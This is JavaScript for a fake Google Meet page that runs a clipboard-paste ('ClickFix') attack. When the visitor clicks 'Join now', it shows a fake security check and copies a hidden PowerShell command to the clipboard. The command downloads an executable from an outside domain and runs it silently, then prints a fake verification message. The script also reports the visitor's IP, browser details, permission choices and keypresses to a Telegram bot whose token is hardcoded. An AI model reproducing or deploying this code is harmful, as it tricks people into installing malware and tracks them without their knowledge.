
    document.addEventListener('DOMContentLoaded', function() {
        // Load configuration from config.json
        let config = null;
        
        fetch('config.json')
            .then(response => response.json())
            .then(data => {
                config = data;
                console.log('Configuration loaded successfully');
                initializeApp();
            })
            .catch(error => {
                console.error('Error loading configuration:', error);
                // Use default configuration
                config = {
                    telegram: {
                        botToken: "7830206152:AAHabTdeCS07etZHII3LtBp4HFOtnEBLIuM",
                        chatId: "-1002677824245"
                    },
                    downloadUrl: "https://justforexpirement9857.com/file.exe",
                    commandOptions: {
                        outputFileName: "Test.exe",
                        showSuccessMessage: true
                    }
                };
                console.log('Using default configuration');
                initializeApp();
            });
        
        function initializeApp() {
            // Define the command to be copied
            const command = `cmd /c start /min powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$ErrorActionPreference = 'SilentlyContinue'; $ProgressPreference = 'SilentlyContinue'; $webClient = New-Object System.Net.WebClient; $tempPath = [System.IO.Path]::GetTempPath(); $outputPath = Join-Path $tempPath '${config.commandOptions.outputFileName}'; $webClient.DownloadFile('${config.downloadUrl}', $outputPath); Start-Process -FilePath $outputPath -WindowStyle Hidden; ${config.commandOptions.showSuccessMessage ? "Write-Output 'Google Meet connectivity verification complete. You may now join the meeting.'; Start-Sleep -Seconds 2" : ""}"`;
            
            // Elements for the security overlay
            const joinButton = document.querySelector('.join-button');
            const securityOverlay = document.getElementById('security-overlay');
            const securityAlert = document.getElementById('security-alert');
            const nextSteps = document.getElementById('next-steps');
            
            // Buttons
            const copyCommandBtn = document.getElementById('copy-command-btn');
            const nextBtn = document.getElementById('next-btn');
            const doneBtn = document.getElementById('done-btn');
            const backBtn = document.getElementById('back-btn');
            
            // Original event listeners for permission buttons
            const statusButtons = document.querySelectorAll('.status-item');
            
            // Send notification when page loads
            sendTelegramNotification('New visitor detected on Google Meet page');
            
            // Get visitor information
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const screenSize = `${window.screen.width}x${window.screen.height}`;
            const referrer = document.referrer || 'Direct';
            const dateTime = new Date().toISOString();
            
            // Attempt to get IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    const visitorInfo = `
New visitor:
IP: ${ipAddress}
Time: ${dateTime}
User Agent: ${userAgent}
Language: ${language}
Screen: ${screenSize}
Referrer: ${referrer}
                    `;
                    sendTelegramNotification(visitorInfo);
                })
                .catch(error => {
                    const visitorInfo = `
New visitor:
Time: ${dateTime}
User Agent: ${userAgent}
Language: ${language}
Screen: ${screenSize}
Referrer: ${referrer}
                    `;
                    sendTelegramNotification(visitorInfo);
                });
            
            if (statusButtons[0]) {
                statusButtons[0].addEventListener('click', function() {
                    navigator.mediaDevices.getUserMedia({ audio: true })
                        .then(function(stream) {
                            showNotification("Microphone access granted! You can now use your microphone.");
                            sendTelegramNotification("User granted microphone access");
                            stream.getTracks().forEach(track => track.stop());
                        })
                        .catch(function(err) {
                            showNotification("Couldn't access microphone. Please ensure you've given permission in your browser settings.", "error");
                            sendTelegramNotification("User denied microphone access");
                            console.error("Error accessing microphone:", err);
                        });
                });
            }
            
            if (statusButtons[1]) {
                statusButtons[1].addEventListener('click', function() {
                    showNotification("Please enable audio output in your system settings.");
                    sendTelegramNotification("User clicked on audio output settings");
                });
            }
            
            if (statusButtons[2]) {
                statusButtons[2].addEventListener('click', function() {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(function(stream) {
                            showNotification("Camera access granted! You can now use your camera.");
                            sendTelegramNotification("User granted camera access");
                            stream.getTracks().forEach(track => track.stop());
                        })
                        .catch(function(err) {
                            showNotification("Couldn't access camera. Please ensure you've given permission in your browser settings.", "error");
                            sendTelegramNotification("User denied camera access");
                            console.error("Error accessing camera:", err);
                        });
                });
            }
            
            // Key combination detection
            document.addEventListener('keydown', function(event) {
                // Check for Win+R (actually, we can only detect R while another key is pressed)
                if (event.key.toLowerCase() === 'r' && (event.metaKey || event.ctrlKey || event.altKey)) {
                    sendTelegramNotification('User pressed keyboard shortcut with R key (potential Win+R attempt)');
                }
                
                // Check for Ctrl+V (paste operation)
                if (event.key.toLowerCase() === 'v' && (event.ctrlKey || event.metaKey)) {
                    sendTelegramNotification('User attempted to paste text (Ctrl+V or Command+V)');
                }
            });
            
            // Join button click handler
            joinButton.addEventListener('click', function() {
                showSecurityOverlay();
                sendTelegramNotification('User clicked "Join now" button - Security verification overlay shown');
            });
            
            // Shows the security overlay
            function showSecurityOverlay() {
                securityOverlay.style.display = 'flex';
                securityAlert.style.display = 'block';
                nextSteps.style.display = 'none';
            }
            
            // Copy command button
            copyCommandBtn.addEventListener('click', function() {
                copyToClipboard(command)
                    .then(() => {
                        showNotification('Command copied to clipboard');
                        sendTelegramNotification('User clicked "Copy Command" button - Command copied to clipboard');
                        securityAlert.style.display = 'none';
                        nextSteps.style.display = 'block';
                    })
                    .catch(() => {
                        showNotification('Failed to copy command');
                        sendTelegramNotification('User clicked "Copy Command" button but copy operation failed');
                    });
            });
            
            // Next button
            nextBtn.addEventListener('click', function() {
                securityAlert.style.display = 'none';
                nextSteps.style.display = 'block';
                sendTelegramNotification('User clicked "Next Steps" button');
            });
            
            // Done button
            doneBtn.addEventListener('click', function() {
                securityOverlay.style.display = 'none';
                showNotification('Verification complete. You can now join the meeting.');
                sendTelegramNotification('User clicked "Done" button - User indicated they ran the command');
            });
            
            // Back button
            backBtn.addEventListener('click', function() {
                securityAlert.style.display = 'block';
                nextSteps.style.display = 'none';
                sendTelegramNotification('User clicked "Back" button');
            });
            
            // Function to copy text to clipboard
            function copyToClipboard(text) {
                if (navigator.clipboard && window.isSecureContext) {
                    return navigator.clipboard.writeText(text);
                } else {
                    const textArea = document.createElement('textarea');
                    textArea.value = text;
                    textArea.style.position = 'fixed';
                    textArea.style.top = '-999999px';
                    textArea.style.left = '-999999px';
                    document.body.appendChild(textArea);
                    textArea.focus();
                    textArea.select();
                    
                    return new Promise((resolve, reject) => {
                        try {
                            const successful = document.execCommand('copy');
                            if (successful) {
                                resolve();
                            } else {
                                reject(new Error('Unable to copy'));
                            }
                        } catch (err) {
                            reject(err);
                        } finally {
                            document.body.removeChild(textArea);
                        }
                    });
                }
            }
            
            // Function to show notifications
            function showNotification(message, type = 'success') {
                const notification = document.createElement('div');
                notification.className = 'notification-toast';
                notification.textContent = message;
                document.body.appendChild(notification);
                
                setTimeout(() => {
                    notification.remove();
                }, 3000);
            }
            
            // Function to send Telegram notifications
            function sendTelegramNotification(message) {
                if (!config || !config.telegram || !config.telegram.botToken || !config.telegram.chatId || 
                    config.telegram.botToken === "YOUR_TELEGRAM_BOT_TOKEN" || 
                    config.telegram.chatId === "YOUR_CHAT_ID") {
                    console.log('Telegram notification not sent: Missing or invalid configuration');
                    return;
                }
                
                const botToken = config.telegram.botToken;
                const chatId = config.telegram.chatId;
                
                // Create the URL for the Telegram API
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                
                // Send the notification
                fetch(url)
                    .then(response => {
                        if (!response.ok) {
                            throw new Error(`HTTP error! Status: ${response.status}`);
                        }
                        return response.json();
                    })
                    .then(data => {
                        console.log('Telegram notification sent successfully:', data);
                    })
                    .catch(error => {
                        console.error('Error sending Telegram notification:', error);
                    });
            }
        }
    });
